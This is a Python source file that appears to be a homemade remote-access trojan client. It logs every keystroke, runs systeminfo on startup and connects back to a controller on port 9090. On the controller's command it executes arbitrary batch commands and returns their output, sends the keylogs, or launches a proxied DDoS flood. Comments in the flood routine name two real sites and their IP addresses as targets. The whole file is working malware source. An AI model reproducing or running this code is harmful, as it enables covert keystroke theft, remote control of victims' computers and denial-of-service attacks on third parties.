import keyboard
from threading import Thread
import threading
import time
import socket
import os
import subprocess
import random
from urllib.request import urlopen,Request
from bs4 import BeautifulSoup

def get_ip():
    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    s.connect(('10.255.255.255',1))
    LAN_IP=s.getsockname()[0]
    return LAN_IP

def find(name, path):
    for root, dirs, files in os.walk(path):
        if name in files:
            return os.path.join(root, name)

class ThreadWithReturnValue(Thread):
    def __init__(self, group=None, target=None, name=None,args=(), kwargs={}, Verbose=None):
        Thread.__init__(self, group, target, name, args, kwargs)
        self._return = None
    def run(self):
        if self._target is not None:
            self._return = self._target(*self._args,
                                                **self._kwargs)
    def join(self, *args):
        Thread.join(self, *args)
        return self._return

def KeyLogger():
    
    def Print():
        prev_size=100
        while True:
            print(f"{keys.strip()}{' '*prev_size}", end='\r')
            prev_size=len(keys)

    def Save():
        while True:
            with open(r"C:\Users\peter\Documents\Programming\Python\Python_Projects\Hacks\KeyboardRecorder\keylogs.txt","w") as keylogs:
                keylogs.write(keys)

    def LetterRecorder(letter):
        while True:
            recorded=str(keyboard.record(until=letter))
            AllLetters.append(recorded)

    def Record(letter):
        letter=Thread(target=LetterRecorder, args=(letter,))
        letter.start()

    AllLetters=["None","None"]

    #F
    Record("f1")
    Record("f2")
    Record("f3")
    Record("f4")
    Record("f5")
    Record("f6")
    Record("f7")
    Record("f8")
    Record("f9")
    Record("f10")
    Record("f11")
    Record("f12")

    #Commands
    Record("print screen")
    Record("scroll lock")
    Record("pause")
    Record("backspace")
    Record("caps lock")
    Record("enter")
    Record("right shift")
    Record("delete")
    Record("home")
    Record("num lock")
    Record("insert")
    Record("end")
    Record("tab")
    Record("page up")
    Record("page down")
    Record("ctrl")
    Record("alt")
    Record("space")
    Record("right alt")
    Record("menu")
    Record("right ctrl")
    Record("left")
    Record("down")
    Record("right")
    Record("up")
    Record("left windows")
    Record("esc")

    #Symbols
    Record("`")
    Record("~")
    Record("-")
    Record("=")
    Record("!")
    Record("@")
    Record("#")
    Record("$")
    Record("%")
    Record("&")
    Record("(")
    Record(")")
    Record("_")
    Record("+")
    Record("[")
    Record("]")
    Record("{")
    Record("}")
    Record("|")
    Record(";")
    Record("'")
    Record(":")
    Record('"')
    Record(",")
    Record(".")
    Record("/")
    Record("<")
    Record(">")
    Record("?")
    Record("*")
    Record("^")

    #Numbers
    Record("1")
    Record("2")
    Record("3")
    Record("4")
    Record("5")
    Record("6")
    Record("7")
    Record("8")
    Record("9")
    Record("0")

    #Letters
    Record("a")
    Record("b")
    Record("c")
    Record("d")
    Record("e")
    Record("f")
    Record("g")
    Record("h")
    Record("i")
    Record("j")
    Record("k")
    Record("l")
    Record("m")
    Record("n")
    Record("o")
    Record("p")
    Record("q")
    Record("r")
    Record("s")
    Record("t")
    Record("u")
    Record("v")
    Record("w")
    Record("x")
    Record("y")
    Record("z")

    keys=""
    #Save1=threading.Thread(target=Save)
    #Save1.start()

    while True:
        Keylogs=str(AllLetters)+"\n"

        rawkeys=""
        Start=0
        End=0
        AllButtons=["$BUTTONS=NONE$"]
        while Keylogs[Start]!="\n":
            if Keylogs[Start-1]=="(":
                End=0
                Button=""
                while Keylogs[Start+End:Start+End+6]!=" down)" and Keylogs[Start+End:Start+End+4]!=" up)":
                    Button+=Keylogs[Start+End]
                    End+=1
                if Button=="space":
                    rawkeys+=" "
                elif Keylogs[Start+End+1]=="d":
                    AllButtons.append(Button)
                    if Button=="enter":
                        rawkeys+=" (enter) "
                    elif (Button=="shift" and AllButtons[-1]=="shift"):
                        pass
                    else:
                        if Button=="backspace":
                            rawkeys=rawkeys[:-1]
                        else:
                            rawkeys+=Button
            Start+=1

        listkeys=list(rawkeys)
        keys=("".join(listkeys))

        yield keys

        #Print1=threading.Thread(target=Print)
        #Print1.start()

        #with open(r"C:\Users\peter\Documents\Programming\Python\Python_Projects\Hacks\KeyboardRecorder\keylogs.txt","r") as file:
            #print (file.read())

def DDOS(TargetDN,TargetIP,TargetPort):
    #DN = www.marmaridis.gr | IP = 88.198.23.34
    #DN = www.dstat.cc | IP = 104.21.68.158


    import socket
    import threading
    import random
    from urllib.request import urlopen,Request
    from bs4 import BeautifulSoup

    ProxiesIP=["107.151.182.247"]
    ProxiesPort=[80]

    req=Request("https://free-proxy-list.net", headers={'User-Agent': 'Mozilla/5.0'})
    html_code=urlopen(req).read().decode("utf-8")
    Soup=BeautifulSoup(html_code, "lxml")
    PL=Soup.find_all('tr')


    RawListString=" ".join(str(e) for e in PL)
    SemiRawListString=str(RawListString                                  
    .replace("<td>"," ")
    .replace("</td>","")
    .replace('<td class="hm">'," ")
    .replace('<td class="hx">'," ")
    .replace("</tr>","")
    .replace("<tr>","\n")
    .replace("proxy",""))[1:]
    Lines=0
    for j in range(len(SemiRawListString)):
        if SemiRawListString[j]=="\n":
            Lines+=1
    ListString="\n".join(SemiRawListString.split("\n")[1:300-Lines])


    #PREPEI NA VRISKEI TO ARXEIO KAI NA TO DIMIOURGEI STOU ALLOUNOU TO PC OXI STO DIKO SOU EXIPNE
    #with open(Path+"DetailedProxyList.txt","w") as File:
    #    File.write(ListString)
    #NOMIZO AUTI EINAI I LISI
    
    with open(r"C:\Users\peter\Documents\Programming\Python\Python_Projects\Hacks\WebScraper\DetailedProxyList.txt","w") as File:
        File.write(ListString)
    StringList=list(ListString.split(" "))[1:]


    for i in range(len(StringList)):
        if StringList[i]==" ":
            pass
        if "." in StringList[i]:
            IPPosition=i
            if (StringList[i+4]=="elite" or StringList[i+4]=="anonymous") or (StringList[i+5]=="elite" or StringList[i+5]=="anonymous") or (StringList[i+6]=="elite" or StringList[i+6]=="anonymous"):
                ProxiesIP.append(StringList[i]) 
                Secure=True
        if i==IPPosition+1:
            ProxiesPort.append(int(StringList[i]))


    Connect = f"CONNECT {TargetDN} HTTP/1.1"
    attack_num = 0
    Failed=[0]
    def Attack(ProxyIP,ProxyPort):
        while True:
            bytes=random._urandom(1490)
            try:
                Connection=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                Connection.connect((ProxyIP,ProxyPort))
                Connection.sendto(str.encode(Connect),(TargetIP, TargetPort))
                #Connection.sendto(bytes, (TargetIP, TargetPort))
                Connection.sendto(("GET /" + TargetIP + " HTTP/1.1\r\n").encode('ascii'), (TargetIP, TargetPort))
                Connection.sendto(("Host: " + ProxyIP + "\r\n\r\n").encode('ascii'), (TargetIP, TargetPort))
                global attack_num
                attack_num+=1
                Connection.close()
                print ("Done")
            except:
                pass

    ThreadCounter=0
    Counter=0
    while True:
        if ThreadCounter>2000:
            pass
        else:
            thread=threading.Thread(target=Attack, args=(ProxiesIP[0],ProxiesPort[0],))
            thread.start()
            ThreadCounter+=1
        if Counter==len(ProxiesIP)-1:
            Counter=0
        else:
            Counter+=1



def Handle():
    Command=""
    while True:
        for i in (KeyLoggerThread.join()):
            SendKeys=i
            break
        Message=client.recv(1024).decode('utf-8')
        if Message == 'NICK':
            client.send(Nickname.encode('utf-8'))
        else:
            if "/" in Message:
                Command+=Message[1:]+"\n"
            elif Message=="END":
                CommandFile=open(Path+"C8KCjs.bat","w")
                CommandFile.write(Command[:-1]+" > "+Path+"O5ESa7.txt")
                CommandFile.close()
                subprocess.call(r"{}C8KCjs.bat".format(Path))
                try:
                    OutputFile=open(Path+"O5ESa7.txt","r")
                    Output=str(OutputFile.read())
                    OutputFile.close()
                    os.remove(Path+"O5ESa7.txt")
                    os.remove(Path+"C8KCjs.bat")
                    client.send(Output.encode("utf-8"))
                except Exception:
                    client.send("Couldn't Pass Output Through".encode("utf-8"))
                Command=""
                Message=""
            elif Message=="KEYLOGS":        
                client.send(str(SendKeys).encode("utf-8"))
            elif Message=="DDOS":
                TargetDN=client.recv(1024).decode('utf-8')
                TargetIP=client.recv(1024).decode('utf-8')
                TargetPort=client.recv(1024).decode('utf-8')
                DDos=threading.Thread(target=DDOS, args=(TargetDN,TargetIP,TargetPort,))
                DDos.start()
            else:
                print(Message)

KeyList=["$KEYS=NONE$"]

Path=find("C8dq5j.py",r"C:\Users")[:-9]

CommandFile=open(Path+"C8KCjs.bat","w")
CommandFile.write("systeminfo"+" > "+Path+"O5ESa7.txt")
CommandFile.close()
subprocess.call(r"{}C8KCjs.bat".format(Path))
OutputFile=open(Path+"O5ESa7.txt",encoding="utf-8",errors='surrogateescape')
OutputFile.seek(29,0)
Nickname=OutputFile.readline()[:-1]
OutputFile.close()
os.remove(Path+"O5ESa7.txt")
os.remove(Path+"C8KCjs.bat")

Host=("192.168.1.13")
Port=9090

client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect((get_ip(),Port))

KeyLoggerThread=ThreadWithReturnValue(target=KeyLogger)
KeyLoggerThread.start()

HandleThread=Thread(target=Handle)
HandleThread.start()